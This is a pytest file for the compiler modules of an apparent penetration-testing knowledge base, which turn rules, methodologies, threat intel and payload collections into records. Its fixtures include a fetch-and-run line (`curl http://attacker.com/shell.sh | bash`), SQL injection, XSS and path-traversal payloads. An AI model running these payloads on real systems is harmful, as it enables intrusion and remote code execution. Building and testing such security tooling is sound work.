# test_knowledge_compilers.py
# Tests for all four knowledge compiler modules using tiny synthetic fixtures.
"""Tests for policy_compiler, methodology_compiler, intel_compiler, and payload_compiler.

All tests use tmp_path fixtures — no real huge knowledge directories required.
No network access; all sources are synthetic in-memory text.
"""
from __future__ import annotations

import json
import pathlib
import textwrap

import pytest



# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _load_jsonl(path: pathlib.Path) -> list[dict]:
    if not path.exists():
        return []
    records = []
    for line in path.read_text().splitlines():
        line = line.strip()
        if line:
            records.append(json.loads(line))
    return records


def _required_fields() -> set[str]:
    return {"id", "source_family", "source_type", "source_path", "title", "text", "tags", "confidence"}


# ---------------------------------------------------------------------------
# policy_compiler
# ---------------------------------------------------------------------------

class TestPolicyCompiler:
    def test_missing_dir_returns_zero(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.policy_compiler import compile_policy
        assert compile_policy(tmp_path / "nonexistent", tmp_path / "out") == 0

    def test_htb_rule_file_produces_htb_rule_records(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.policy_compiler import compile_policy
        src = tmp_path / "src"
        src.mkdir()
        (src / "htb_platform_rules.md").write_text(textwrap.dedent("""\
            # HTB Rules
            - You must not attack other users.
            - You shall not scan unauthorized hosts.
            - Prohibited actions include DDoS.
        """))
        out = tmp_path / "out"
        count = compile_policy(src, out)
        assert count > 0
        records = _load_jsonl(out / "policy_records.jsonl")
        assert all(r["source_type"] == "htb_rule" for r in records)
        assert all(r["confidence"] >= 0.9 for r in records)

    def test_legal_doc_gets_lower_confidence(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.policy_compiler import compile_policy
        src = tmp_path / "src"
        src.mkdir()
        (src / "terms_of_service.md").write_text(textwrap.dedent("""\
            # Terms of Service
            Users must comply with all applicable laws.
            This platform may not be used for illegal activities.
        """))
        out = tmp_path / "out"
        compile_policy(src, out)
        records = _load_jsonl(out / "policy_records.jsonl")
        assert records
        assert all(r["source_type"] == "legal_doc" for r in records)
        assert all(r["confidence"] < 0.9 for r in records)

    def test_all_required_fields_present(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.policy_compiler import compile_policy
        src = tmp_path / "src"
        src.mkdir()
        (src / "htb_platform_rules.md").write_text("- You must follow the rules at all times.\n")
        out = tmp_path / "out"
        compile_policy(src, out)
        records = _load_jsonl(out / "policy_records.jsonl")
        for r in records:
            assert _required_fields().issubset(r.keys())

    def test_htb_yaml_written_when_htb_rules_present(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.policy_compiler import compile_policy
        src = tmp_path / "src"
        src.mkdir()
        (src / "htb_platform_rules.md").write_text("- You must not exploit production systems.\n")
        out = tmp_path / "out"
        compile_policy(src, out)
        assert (out / "hackthebox_lab.yaml").exists()

    def test_pdf_stub_has_low_confidence(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.policy_compiler import compile_policy
        src = tmp_path / "src"
        src.mkdir()
        (src / "agreement.pdf").write_bytes(b"%PDF-1.4 stub")
        out = tmp_path / "out"
        count = compile_policy(src, out)
        assert count == 1
        records = _load_jsonl(out / "policy_records.jsonl")
        assert records[0]["confidence"] == pytest.approx(0.4)
        assert records[0]["metadata"]["pdf_stub"] is True

    def test_empty_directory_produces_zero_records(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.policy_compiler import compile_policy
        src = tmp_path / "src"
        src.mkdir()
        out = tmp_path / "out"
        count = compile_policy(src, out)
        assert count == 0

    def test_idempotent_same_id_on_rerun(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.policy_compiler import compile_policy
        src = tmp_path / "src"
        src.mkdir()
        (src / "htb_platform_rules.md").write_text("- You must not attack others without authorization.\n")
        out = tmp_path / "out"
        compile_policy(src, out)
        ids_first = {r["id"] for r in _load_jsonl(out / "policy_records.jsonl")}
        compile_policy(src, out)
        ids_second = {r["id"] for r in _load_jsonl(out / "policy_records.jsonl")}
        assert ids_first == ids_second


# ---------------------------------------------------------------------------
# methodology_compiler
# ---------------------------------------------------------------------------

class TestMethodologyCompiler:
    def test_missing_dir_returns_zero(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.methodology_compiler import compile_methodology
        assert compile_methodology(tmp_path / "nonexistent", tmp_path / "out") == 0

    def test_markdown_splits_on_h2_headings(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.methodology_compiler import compile_methodology
        src = tmp_path / "src"
        src.mkdir()
        (src / "ptes.md").write_text(textwrap.dedent("""\
            # PTES Technical Guidelines

            ## Reconnaissance
            Gather information about the target.

            ## Exploitation
            Attempt to exploit discovered vulnerabilities.
        """))
        out = tmp_path / "out"
        count = compile_methodology(src, out)
        assert count >= 2

    def test_records_have_methodology_family_and_type(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.methodology_compiler import compile_methodology
        src = tmp_path / "src"
        src.mkdir()
        (src / "guide.md").write_text("## Testing steps\nStep one. Step two.\n")
        out = tmp_path / "out"
        compile_methodology(src, out)
        records = _load_jsonl(out / "methodology_chunks.jsonl")
        assert records
        assert all(r["source_family"] == "methodology_db" for r in records)
        assert all(r["source_type"] == "methodology" for r in records)

    def test_pdf_stub_record_produced(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.methodology_compiler import compile_methodology
        src = tmp_path / "src"
        src.mkdir()
        (src / "nist_800_115.pdf").write_bytes(b"%PDF-1.4 stub")
        out = tmp_path / "out"
        count = compile_methodology(src, out)
        assert count == 1
        records = _load_jsonl(out / "methodology_chunks.jsonl")
        assert records[0]["metadata"]["pdf_stub"] is True
        assert records[0]["confidence"] == pytest.approx(0.4)

    def test_all_required_fields_present(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.methodology_compiler import compile_methodology
        src = tmp_path / "src"
        src.mkdir()
        (src / "method.txt").write_text("## Intro\nSome methodology text here for testing.\n")
        out = tmp_path / "out"
        compile_methodology(src, out)
        for r in _load_jsonl(out / "methodology_chunks.jsonl"):
            assert _required_fields().issubset(r.keys())

    def test_size_chunking_when_no_headings(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.methodology_compiler import compile_methodology
        src = tmp_path / "src"
        src.mkdir()
        (src / "flat.txt").write_text("x" * 4000)
        out = tmp_path / "out"
        count = compile_methodology(src, out)
        assert count >= 2

    def test_nist_tag_applied(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.methodology_compiler import compile_methodology
        src = tmp_path / "src"
        src.mkdir()
        (src / "nist_framework.md").write_text("## Section\nSome nist content.\n")
        out = tmp_path / "out"
        compile_methodology(src, out)
        records = _load_jsonl(out / "methodology_chunks.jsonl")
        assert any("nist" in r["tags"] for r in records)


# ---------------------------------------------------------------------------
# intel_compiler
# ---------------------------------------------------------------------------

class TestIntelCompiler:
    def test_missing_dir_returns_zero(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.intel_compiler import compile_intel
        assert compile_intel(tmp_path / "nonexistent", tmp_path / "out") == 0

    def test_attack_json_produces_technique_records(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.intel_compiler import compile_intel
        intel = tmp_path / "intel_db"
        attack_dir = intel / "attack"
        attack_dir.mkdir(parents=True)
        stix = {
            "type": "bundle",
            "objects": [
                {
                    "type": "attack-pattern",
                    "name": "Spearphishing Attachment",
                    "description": "Adversaries may send spearphishing emails with attachments to gain access.",
                    "external_references": [
                        {"source_name": "mitre-attack", "external_id": "T1566.001"}
                    ],
                }
            ],
        }
        (attack_dir / "enterprise-attack.json").write_text(json.dumps(stix))
        out = tmp_path / "out"
        total = compile_intel(intel, out)
        assert total >= 1
        records = _load_jsonl(out / "attack_techniques.jsonl")
        assert records
        assert records[0]["source_type"] == "attack"
        assert "T1566.001" in records[0]["text"]

    def test_attack_revoked_skipped(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.intel_compiler import compile_intel
        intel = tmp_path / "intel_db"
        (intel / "attack").mkdir(parents=True)
        stix = {
            "type": "bundle",
            "objects": [
                {
                    "type": "attack-pattern",
                    "name": "Old Technique",
                    "description": "This technique is no longer active.",
                    "revoked": True,
                    "external_references": [],
                }
            ],
        }
        (intel / "attack" / "enterprise-attack.json").write_text(json.dumps(stix))
        out = tmp_path / "out"
        compile_intel(intel, out)
        records = _load_jsonl(out / "attack_techniques.jsonl")
        assert len(records) == 0

    def test_cwe_xml_produces_weakness_records(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.intel_compiler import compile_intel
        intel = tmp_path / "intel_db"
        cwe_dir = intel / "cwe"
        cwe_dir.mkdir(parents=True)
        xml = textwrap.dedent("""\
            <?xml version="1.0"?>
            <Weakness_Catalog>
              <Weaknesses>
                <Weakness ID="79" Name="Improper Neutralization of Input During Web Page Generation">
                  <Description>The application does not neutralize user input before placing it in output.</Description>
                </Weakness>
              </Weaknesses>
            </Weakness_Catalog>
        """)
        (cwe_dir / "cwe.xml").write_text(xml)
        out = tmp_path / "out"
        compile_intel(intel, out)
        records = _load_jsonl(out / "cwe_weaknesses.jsonl")
        assert records
        assert records[0]["source_type"] == "cwe"
        assert "CWE-79" in records[0]["text"]

    def test_capec_xml_produces_pattern_records(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.intel_compiler import compile_intel
        intel = tmp_path / "intel_db"
        capec_dir = intel / "capec"
        capec_dir.mkdir(parents=True)
        xml = textwrap.dedent("""\
            <?xml version="1.0"?>
            <Attack_Pattern_Catalog>
              <Attack_Patterns>
                <Attack_Pattern ID="62" Name="Cross-Site Request Forgery">
                  <Description>An attacker crafts malicious web content that causes the victim to unknowingly submit a request.</Description>
                </Attack_Pattern>
              </Attack_Patterns>
            </Attack_Pattern_Catalog>
        """)
        (capec_dir / "capec.xml").write_text(xml)
        out = tmp_path / "out"
        compile_intel(intel, out)
        records = _load_jsonl(out / "capec_patterns.jsonl")
        assert records
        assert records[0]["source_type"] == "capec"
        assert "CAPEC-62" in records[0]["text"]

    def test_cve_nvd20_format_parsed(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.intel_compiler import compile_intel
        intel = tmp_path / "intel_db"
        cve_dir = intel / "cve"
        cve_dir.mkdir(parents=True)
        nvd = {
            "vulnerabilities": [
                {
                    "cve": {
                        "id": "CVE-2021-44228",
                        "published": "2021-12-10T00:00:00.000",
                        "descriptions": [
                            {"lang": "en", "value": "Apache Log4j2 allows remote code execution via JNDI."}
                        ],
                        "metrics": {},
                    }
                }
            ]
        }
        (cve_dir / "nvdcve-2.0-2021.json").write_text(json.dumps(nvd))
        out = tmp_path / "out"
        compile_intel(intel, out)
        records = _load_jsonl(out / "cve_slim.jsonl")
        assert records
        assert records[0]["source_type"] == "cve"
        assert "CVE-2021-44228" in records[0]["text"]

    def test_cve_nvd1x_format_parsed(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.intel_compiler import compile_intel
        intel = tmp_path / "intel_db"
        cve_dir = intel / "cve"
        cve_dir.mkdir(parents=True)
        nvd = {
            "CVE_Items": [
                {
                    "cve": {
                        "CVE_data_meta": {"ID": "CVE-2017-0144"},
                        "description": {
                            "description_data": [
                                {"lang": "en", "value": "Windows SMBv1 allows remote code execution via EternalBlue."}
                            ]
                        },
                    }
                }
            ]
        }
        (cve_dir / "nvdcve-1.1-2017.json").write_text(json.dumps(nvd))
        out = tmp_path / "out"
        compile_intel(intel, out)
        records = _load_jsonl(out / "cve_slim.jsonl")
        assert records
        assert "CVE-2017-0144" in records[0]["text"]

    def test_missing_subdir_degrades_gracefully(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.intel_compiler import compile_intel
        intel = tmp_path / "intel_db"
        intel.mkdir()
        out = tmp_path / "out"
        total = compile_intel(intel, out)
        assert total == 0

    def test_malformed_json_skipped(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.intel_compiler import compile_intel
        intel = tmp_path / "intel_db"
        (intel / "attack").mkdir(parents=True)
        (intel / "attack" / "enterprise-attack.json").write_text("NOT JSON")
        out = tmp_path / "out"
        compile_intel(intel, out)
        records = _load_jsonl(out / "attack_techniques.jsonl")
        assert records == []

    def test_intel_records_have_required_fields(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.intel_compiler import compile_intel
        intel = tmp_path / "intel_db"
        (intel / "attack").mkdir(parents=True)
        stix = {
            "type": "bundle",
            "objects": [
                {
                    "type": "attack-pattern",
                    "name": "Technique Alpha",
                    "description": "A technique that does something interesting for attackers.",
                    "external_references": [{"source_name": "mitre-attack", "external_id": "T9999"}],
                }
            ],
        }
        (intel / "attack" / "enterprise-attack.json").write_text(json.dumps(stix))
        out = tmp_path / "out"
        compile_intel(intel, out)
        for r in _load_jsonl(out / "attack_techniques.jsonl"):
            assert _required_fields().issubset(r.keys())


# ---------------------------------------------------------------------------
# payload_compiler
# ---------------------------------------------------------------------------

class TestPayloadCompiler:
    def test_missing_dir_returns_zero_tuple(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.payload_compiler import compile_payload
        result = compile_payload(tmp_path / "nonexistent", tmp_path / "out")
        assert result == (0, 0)

    def test_markdown_file_produces_payload_records(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.payload_compiler import compile_payload
        src = tmp_path / "payload_db"
        (src / "PayloadsAllTheThings" / "SQLi").mkdir(parents=True)
        (src / "PayloadsAllTheThings" / "SQLi" / "README.md").write_text(textwrap.dedent("""\
            # SQL Injection

            ## Basic Payloads
            Use `' OR 1=1 --` to bypass login forms.

            ## Blind Payloads
            Use time-based payloads for blind injection.
        """))
        out = tmp_path / "out"
        p_count, m_count = compile_payload(src, out)
        assert p_count >= 2
        assert m_count == 0

    def test_yaml_file_produces_payload_record(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.payload_compiler import compile_payload
        src = tmp_path / "payload_db"
        (src / "GTFOBins" / "curl").mkdir(parents=True)
        yaml_content = textwrap.dedent("""\
            Name: curl
            Description: Read and write files, make HTTP requests.
            Commands:
              - Command: "curl http://target/file"
                Description: Fetch a remote file
                Usecase: File read / SSRF
        """)
        (src / "GTFOBins" / "curl" / "curl.yaml").write_text(yaml_content)
        out = tmp_path / "out"
        p_count, m_count = compile_payload(src, out)
        assert p_count >= 1
        assert m_count == 0
        records = _load_jsonl(out / "payload_records.jsonl")
        assert any("curl" in r["title"].lower() or "curl" in r["text"] for r in records)

    def test_seclists_file_produces_manifest_not_content(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.payload_compiler import compile_payload
        src = tmp_path / "payload_db"
        (src / "SecLists" / "Discovery" / "Web-Content").mkdir(parents=True)
        wl = src / "SecLists" / "Discovery" / "Web-Content" / "common.txt"
        wl.write_text("\n".join([f"word{i}" for i in range(200)]))
        out = tmp_path / "out"
        p_count, m_count = compile_payload(src, out)
        assert p_count == 0
        assert m_count >= 1
        manifests = _load_jsonl(out / "wordlist_manifest.jsonl")
        # The manifest text must NOT contain individual wordlist lines
        for m in manifests:
            assert "word0" not in m["text"]
            assert "word99" not in m["text"]
            assert m["source_type"] == "wordlist_manifest"

    def test_seclists_passwords_dir_marked_restricted(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.payload_compiler import compile_payload
        src = tmp_path / "payload_db"
        (src / "SecLists" / "Passwords").mkdir(parents=True)
        (src / "SecLists" / "Passwords" / "10k-most-common.txt").write_text(
            "\n".join(["pass1", "pass2", "letmein", "12345"])
        )
        out = tmp_path / "out"
        _, m_count = compile_payload(src, out)
        assert m_count >= 1
        manifests = _load_jsonl(out / "wordlist_manifest.jsonl")
        for m in manifests:
            assert m["metadata"]["restricted_use"] == "explicit_operator_approval_required"

    def test_seclists_discovery_not_restricted(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.payload_compiler import compile_payload
        src = tmp_path / "payload_db"
        (src / "SecLists" / "Discovery").mkdir(parents=True)
        (src / "SecLists" / "Discovery" / "dirs.txt").write_text("admin\nlogin\napi\n")
        out = tmp_path / "out"
        _, m_count = compile_payload(src, out)
        assert m_count >= 1
        manifests = _load_jsonl(out / "wordlist_manifest.jsonl")
        for m in manifests:
            assert m["metadata"]["restricted_use"] == "general"

    def test_manifest_has_required_metadata(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.payload_compiler import compile_payload
        src = tmp_path / "payload_db"
        (src / "SecLists" / "Usernames").mkdir(parents=True)
        (src / "SecLists" / "Usernames" / "names.txt").write_text("alice\nbob\ncharlie\n")
        out = tmp_path / "out"
        compile_payload(src, out)
        manifests = _load_jsonl(out / "wordlist_manifest.jsonl")
        for m in manifests:
            assert "category" in m["metadata"]
            assert "approx_lines" in m["metadata"]
            assert "recommended_use" in m["metadata"]
            assert "restricted_use" in m["metadata"]

    def test_all_required_fields_in_payload_records(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.payload_compiler import compile_payload
        src = tmp_path / "payload_db"
        (src / "PayloadsAllTheThings").mkdir(parents=True)
        (src / "PayloadsAllTheThings" / "payloads.md").write_text(
            "## XSS Payloads\n<script>alert(1)</script>\n"
        )
        out = tmp_path / "out"
        compile_payload(src, out)
        for r in _load_jsonl(out / "payload_records.jsonl"):
            assert _required_fields().issubset(r.keys())

    def test_idempotent_payload_ids(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.payload_compiler import compile_payload
        src = tmp_path / "payload_db"
        (src / "PayloadsAllTheThings").mkdir(parents=True)
        (src / "PayloadsAllTheThings" / "commands.md").write_text(
            "## Remote Code Execution\n`curl http://attacker.com/shell.sh | bash`\n"
        )
        out = tmp_path / "out"
        compile_payload(src, out)
        ids_first = {r["id"] for r in _load_jsonl(out / "payload_records.jsonl")}
        compile_payload(src, out)
        ids_second = {r["id"] for r in _load_jsonl(out / "payload_records.jsonl")}
        assert ids_first == ids_second

    def test_mixed_content_routes_correctly(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.payload_compiler import compile_payload
        src = tmp_path / "payload_db"
        # Payload source
        (src / "PayloadsAllTheThings").mkdir(parents=True)
        (src / "PayloadsAllTheThings" / "lfi.md").write_text(
            "## LFI\n../../etc/passwd is a common local file inclusion target.\n"
        )
        # SecLists wordlist
        (src / "SecLists" / "Discovery").mkdir(parents=True)
        (src / "SecLists" / "Discovery" / "lfi.txt").write_text("../etc/passwd\n../../etc/passwd\n")
        out = tmp_path / "out"
        p_count, m_count = compile_payload(src, out)
        assert p_count >= 1
        assert m_count >= 1

    def test_unknown_extension_skipped_gracefully(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.payload_compiler import compile_payload
        src = tmp_path / "payload_db"
        (src / "PayloadsAllTheThings").mkdir(parents=True)
        (src / "PayloadsAllTheThings" / "binary.bin").write_bytes(b"\x00\x01\x02")
        out = tmp_path / "out"
        p_count, m_count = compile_payload(src, out)
        assert p_count == 0
        assert m_count == 0


# ---------------------------------------------------------------------------
# compile_knowledge CLI
# ---------------------------------------------------------------------------

class TestCompileKnowledgeCLI:
    def test_no_dirs_returns_nonzero(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.compile_knowledge import main
        result = main(["--knowledge-root", str(tmp_path / "nonexistent")])
        assert result != 0

    def test_policy_dir_via_knowledge_root(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.compile_knowledge import main
        root = tmp_path / "knowledge"
        policy_src = root / "policy_db" / "sources"
        policy_src.mkdir(parents=True)
        (policy_src / "htb_platform_rules.md").write_text(
            "- You must not attack unauthorized targets.\n"
        )
        result = main(["--knowledge-root", str(root)])
        assert result == 0
        assert (root / "policy_db" / "compiled" / "policy_records.jsonl").exists()

    def test_explicit_policy_db_flag(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.compile_knowledge import main
        policy_src = tmp_path / "policy_db" / "sources"
        policy_src.mkdir(parents=True)
        (policy_src / "rules.md").write_text("You must abide by the platform terms.\n")
        result = main(["--policy-db", str(tmp_path / "policy_db")])
        assert result == 0

    def test_multiple_families_compile(self, tmp_path: pathlib.Path) -> None:
        from apex_host.knowledge.compiler.compile_knowledge import main
        root = tmp_path / "knowledge"
        (root / "policy_db" / "sources").mkdir(parents=True)
        (root / "policy_db" / "sources" / "rules.md").write_text(
            "- Users must not attack production systems.\n"
        )
        (root / "methodology_db").mkdir(parents=True)
        (root / "methodology_db" / "guide.md").write_text(
            "## Reconnaissance\nGather information about the target scope.\n"
        )
        result = main(["--knowledge-root", str(root)])
        assert result == 0
        assert (root / "policy_db" / "compiled" / "policy_records.jsonl").exists()
        assert (root / "methodology_db" / "compiled" / "methodology_chunks.jsonl").exists()
